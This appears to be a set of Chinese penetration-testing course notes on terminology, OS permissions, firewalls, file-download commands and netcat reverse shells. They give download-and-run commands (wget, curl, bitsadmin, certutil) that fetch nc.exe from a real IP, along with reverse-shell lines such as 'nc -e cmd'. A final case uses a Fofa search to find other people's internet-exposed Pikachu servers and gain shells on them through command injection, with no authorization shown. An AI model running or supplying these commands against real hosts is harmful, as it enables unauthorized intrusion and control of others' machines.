![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1720344243384-9a12c289-5a0f-452b-a86b-aa988c9f92e3.png)

## 一、专用术语

### **1. POC、EXP、Payload与Shellcode**

https://www.cnblogs.com/sunny11/p/13583083.html  //专有名词介绍

POC：全称 ' Proof of Concept '，中文 ' 概念验证 ' ，常指一段漏洞证明的代码。

EXP：全称 ' Exploit '，中文 ' 利用 '，指利用系统漏洞进行攻击的动作。

Payload：中文 ' 有效载荷 '，指成功exploit之后，真正在目标系统执行的代码或指令。

Shellcode：简单翻译 ' shell代码 '，是Payload的一种，由于其建立正向/反向shell而得名。

//POC是用来证明漏洞存在的，EXP是用来利用漏洞的，两者通常不是一类，或者说，PoC通常是无害的，Exp通常是有害的，有了POC，才有EXP。

Payload有很多种，它可以是Shellcode，也可以直接是一段系统命令。同一个Payload可以用于多个漏洞，但每个漏洞都有其自己的EXP，也就是说不存在通用的EXP。

Shellcode也有很多种，包括正向的，反向的，甚至meterpreter。

Shellcode与Shellshcok不是一个，Shellshock特指14年发现的Shellshock漏洞。



### 2.撞库

  撞库是黑客通过收集互联网已泄露的用户和密码信息，生成对应的字典表，尝试批量登陆其他网站后，得到一系列可以登录的用户。

​    很多用户在不同网站使用的是相同的帐号密码，因此黑客可以通过获取用户在A网站的账户从而尝试登录B网址，这就可以理解为撞库攻击。

### 3.下载命令

https://forum.ywhack.com/bountytips.php?download

得到shell时，可以使用命令下载工具。

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1720344304415-51657239-17ae-430e-bfb4-dfa15bcb6bff.png)

### 4.综合

前后端，POC（验证）/EXP（利用），Payload（以什么权限给到你）/Shellcode（漏洞利用代码），后门（系统等统称）/Webshell（特指网站），木马（控制电脑，操作）/病毒（完全破坏性程序），反弹（权限移交），回显，跳板，黑白盒测试，暴力破解，社会工程学（个人的个性），撞库，ATT&CK(attack.mitre.org)等

## 二、操作系统-用途&命令&权限&用户&防火墙

1.个人计算机&服务器用机 区别

服务器规格较高，内存容量高于pc。服务器旨在全天候运行。服务器中的组件通常可以承受更高的压力。



服务器是一台电脑，可以支持多个应用程序同时运行，可以处理多个同时连接，而电脑不能。



pc代表个人计算机，并已成为所有台式计算机的统称。pc不适合太复杂的应用程序。而服务器起着至关重要的作用，并具有丰富的配置和应用程序。与服务器相比，电脑的速度很慢。服务器可以无中断地运行并处理虚拟连接，并且可以控制多个客户端。



2.Windows&Linux常见命令

随用随查：



【3】web安全入门篇-渗透测试中常用的命令-CSDN博客



3.文件权限&服务权限&用户权限等

提权技术 默认拒绝权限比允许权限高 。后期web需要提权



文件权限：是否可打开文件



用户权限：普通用户的权限和管理员用户的权限



4.系统用户&用户组&服务用户等分类

Administrator（管理员用户）拥有系统的所有权限



Guest （来宾用户）只有来宾用户可以使用，guest用户不用可以删掉



用户组是一群用户的统称，给以给这个组配置不同的权限。



Windows是最高权限是system，Linux是root

administrator删不了c:/system32,但是system用户是可以删除的



5.自带防火墙出站&入站规则策略协议

防火墙的入站与出站规则，通常是严进，宽出。



案例：文件上传下载-解决无图形化&解决数据传输

拿到终端操作发现没有nc工具等情况时，通过下载命令，在执行反弹shell

下载命令连接：https://forum.ywhack.com/bountytips.php?download

一般拿到权限只有cmd这个命令行，不能复制下载等，这时候就需要下载命令

这里自己创建一个直接访问www.xiaodi8.com/nc.exe 就可以直接下载的连接。

Linux命令有：wget curl python ruby perl java等

Windows命令有：PowerShell Certutil Bitsadmin msiexec mshta rundll32等

例如：

Linux - wget:wget http://47.100.167.248:8081/nc.exe -O exploit.exe

Linux - curl:curl http://47.100.167.248:8081/nc.exe -o exploit.exe

Windows-Bitsadmin:bitsadmin /rawreturn /transfer down "http://47.100.167.248:8081/nc.exe" c:\\exploit.exe



下载的时候也要看是否有权限执行，如果没有执行权限，那下载也不会成功

把NC.exe上传至根目录。在kali中执行wget http://47.100.167.248:8081/NC.exe -O exploit.exe，就可以下载文件。

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1720344431932-516b55b3-c790-4bbe-bf20-4638df481b1e.png)

cmd执行：

certutil.exe -urlcache -split -f http://47.100.167.248:8081/NC.exe exploit.exe

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1720344450675-75859d3a-98ba-4c8f-b9bf-4889fc0740b0.png)

## 三、反弹Shell命令-解决数据回显&解决数据通讯

### 反弹shell原因：

执行命令的时候，会有数据的回显，告诉自己这个命令是不是执行成功，有没有文件，但是在大部分的测试环境是没有回显的或者是回显是不齐全的。

例如：

useradd 用户名 passwd 密码

测试Linux系统添加用户或修改密码命令交互回显问题

交互时：

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1720344494592-e732c8ce-032f-450d-a468-ce1cbbdb02b4.png)

回显式：


![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1720344518817-33332625-d7a0-432d-91b7-900b2a34738c.png)

## 案例：防火墙绕过-正向连接&反向连接&内网服务器

1.内网  xiaodi8就是服务器

内网 -> xiaodi8



//内网给shell（nc -e cmd 192.168.192.132 5577）   ip为要发送给监听器的ip

 xiaodi8监听(nc -lvvp 5577)

 xiaodi8 !-> 内网



2.防火墙情况下

情况1：xiaodi8 <-> 阿里云  可以互nc



情况2：xiaodi8防火墙 -> 阿里云

aliyun：(nact www.xiaodi8.com 5566 -e /bin/bash) 

xiaodi8：(nc -lvvp 5566)

//小迪8不可以外联阿里云，阿里云能连小迪8



情况3：xiaodi8 <- 阿里云防火墙

aliyun：(nact www.xiaodi8.com 5566 -e /bin/bash) 

xiaodi8：(nc -lvvp 5566)

//小迪8可以外联阿里云，阿里云不能连小迪8

**正向连接:**

攻击者作为客户端去连接目标主机服务器端口。相当于是攻击者主动去找服务器。

例如： 情况2：xiaodi8服务器防火墙 -> 阿里云失败

aliyun：(nact www.xiaodi8.com 5566 -e /bin/bash)

xiaodi8：(nc -lvvp 5566)



**反向连接:**

目标主机作为客户端去主动访问攻击者的端口。相当于目标主机是客户端，攻击者是服务端。

例如： 情况2：xiaodi8防火墙 -> 阿里云

则：aliyun：(nact 5566 -e /bin/bash)

xiaodi8：(nc -lvvp www.xiaodi8.com 5566)

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1720344599611-42cd8126-c9e4-4bc3-a26d-a1c82064623c.png)

案例:Fofa拿下Pikachu靶场反弹shell

fofa语法：

"pikachu"&&country="CN"&&title=="Get the pikachu"

“pikachu”&&country=“CN”&&title==“Get the pikachu”
用命令把nc上传到对方服务器，然后在代码执行反弹cmd命令

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1720344630422-c8c22e48-fc9d-40d8-b53e-a4a62a6248fa.png)







![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721112816320-760a1962-980f-48df-8b06-4c6a810da758.png)

```plain
基础知识
#知识点：
1、名词解释-渗透测试-漏洞&攻击&后门&代码&专业词

2、必备技能-操作系统-用途&命令&权限&用户&防火墙

3、必备技能-文件下载-缘由&场景&使用-提权&后渗透

4、必备技能-反弹命令-缘由&场景&使用-提权&后渗透

前后端，POC（验证）/EXP（利用），Payload（以什么权限给到你）/Shellcode（漏洞利用代码），后门（系统等统称）/Webshell（特指网站），木马（控制电脑，操作）/病毒（完全破坏性程序），反弹（权限移交），回显，跳板，黑白盒测试，暴力破解，社会工程学（个人的个性），撞库，ATT&CK(attack.mitre.org)等

参考：
https://www.cnblogs.com/sunny11/p/13583083.html  //专有名词介绍
https://forum.ywhack.com/bountytips.php?download //下载命令
https://forum.ywhack.com/reverse-shell/   //反弹shell生成 
https://blog.csdn.net/weixin_43303273/article/details/83029138  //常用命令
```

- 基础案例1：操作系统-用途&命令&权限&用户&防火墙

```plain
1、个人计算机&服务器用机 区别操作服务和个人用机，用途
2、Windows&Linux常见命令 了解，以后知道怎么查和用就可以，https://blog.csdn.net/weixin_43303273/article/details/83029138
3、文件权限&服务权限&用户权限等 提权技术 默认拒绝权限比允许权限高 
4、系统用户&用户组&服务用户等分类
5、自带防火墙出站&入站规则策略协议（ACL）waf应用防火墙针对web 
权限满足不了目的，这时候就需要提权。Windows是最高权限是system，Linux是root
administrator删不了c:/system32,但是system用户是可以删除的

权限问题：用户权限，服务权限，文件权限。
文件权限：创建一个文件，右键属性，可以查看用户的权限，也可以进行修改。
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721112815985-d2dd20f3-fa4b-4fc0-9f39-b0f896ff2b59.png)

设置拒绝后，

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721112816047-f4aa3bad-596e-4ea1-9b74-b9646ed4c7b8.png)

```plain
也会收到组里的权限影响。

低权限用户能做的事情是有限的，不足以完成需要完成的目的，这时候就需要用到提权。看用户和组的权限。
Windows权限：
system	最高权限	能够删除c:/system
administrator	管理员权限（自己定义）	不能删除c:/system
User	一般用户权限	有一些不能查看文件
Linux权限：
root	最高权限
其他用户	一般权限
防护墙：默认防火墙配置是允许网站协议通信，所以在测试的时候感觉开没开都没关系。但是内网渗透测试的时候，就会对协议有影响。
Windows自带防火墙defender，Linux自带iptable。也可以装第三方防火墙。
还有专门针对web防火墙waf，系统自带针对没有针对web的。
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721112816222-1c8a1edc-166c-4acc-94ad-8976ecfb77f1.png)

- 实用案例1：文件上传下载-解决无图形化&解决数据传输

```plain
https://forum.ywhack.com/bountytips.php?download   下载命令，反弹shell命令，可以直接生成命令执行。
一般拿到权限只有cmd这个命令行，不能复制下载等，这时候就需要下载命令
直接访问www.xiaodi8.com/nc.exe 就可以直接下载
Linux：wget curl python ruby perl java等
Windows：PowerShell Certutil Bitsadmin msiexec mshta rundll32等
Linux - wget:wget http://47.100.167.248:8081/nc.exe -O exploit.exe
Linux - curl:curl http://47.100.167.248:8081/nc.exe -o exploit.exe
Windows-Bitsadmin:bitsadmin /rawreturn /transfer down "http://47.100.167.248:8081/nc.exe" c:\\exploit.exe
下载的时候也要看是否有权限执行，如果没有执行权限，那下载也不会成功

把NC.exe上传至根目录。在kali中执行wget http://47.100.167.248:8081/NC.exe -O exploit.exe，就可以下载文件。
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721112816098-cdd2889a-024c-4748-b322-a509dc147f94.png)

```plain
cmd执行：
certutil.exe -urlcache -split -f http://47.100.167.248:8081/NC.exe exploit.exe
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721112816168-8294c8a2-29cb-4145-9377-3e05bdffe2d5.png)

```plain
不过被火绒查杀了。
cmd执行和powershell执行相同道理，都可以进行文件下载执行
```

- 实用案例2：反弹Shell命令-解决数据回显&解决数据通讯

```plain
• 执行命令的时候，会有数据的回显，告诉自己这个命令是不是执行成功，有没有文件，但是在大部分的测试环境是没有回显的。
useradd 用户名 passwd 用户名
测试Linux系统添加用户或修改密码命令交互回显问题
有些工具是不支持回显或者交互式，则这个时候需要反弹shell进行实现交互式和回显
交互式：比如执行passwd xioadi
```

交互式：

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721112816227-e523273e-795b-4282-8a5e-fdfbfd35c304.png)

回显式：

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721112816361-8eeaca8f-9dde-480b-a4f3-b24a86d5fab9.png)

- 结合案例1：防火墙绕过-正向连接&反向连接&内网服务器

```plain
1、内网：
内网 -> xiaodi8 //内网给shell（nc -e cmd 192.168.192.132 5577），xiaodi8监听(nc -lvvp 5577)
xiaodi8 !-> 内网
2、防火墙：
xiaodi8 <-> aliyun aliyun(nact www.xiaodi8.com 5566 -e /bin/bash) xiaodi8(nc -lvvp 5566)
xiaodi8防火墙 -> aliyun xiaodi8可以连接aliyun，aliyun不可以连接xiaodi8
aliyun !-> xiaodi8防火墙
防火墙入站严格，出站宽松

内网-->167.248
192.168.199.135连接192.168.199.130
199.135用nc执行nc-e-cmd -192.168.199.130 5577
199.130执行nc -lvvp 5577      服务器接受不了反弹shell  解决：宝塔端口问题
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721112816506-856c30ab-15aa-476a-ae30-9c818048d38f.png)

```plain
167-->内网完成不了 这个解决只能在路由器完成，进行端口映射。
防火墙：
开了防火墙的一方，能主动出去，但不能被动连接
没开防火墙：135监听 136发送 可以执行。双向都是可以的
135开启防火墙：
135	发送	 136
136	不能发送	 135
完成防火墙测试。
```

- 结合案例2：学会了有手就行-Fofa拿下同行Pikachu服务器

```plain
文件下载&反弹Shell:前面要带上 127.0.0.1&
certutil -urlcache -split -f http://47.100.167.248/NC.exe nc.exe
nc -e cmd 47.75.212.155 5566
语法："pikachu"&&country="CN"&&title=="Get the pikachu"
用命令把nc上传到对方服务器，然后在代码执行反弹cmd命令
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721112816737-8bea1cb3-28ae-4c70-bb7d-60bf4cee910b.png)

但是我很多执行后，没有回显结果。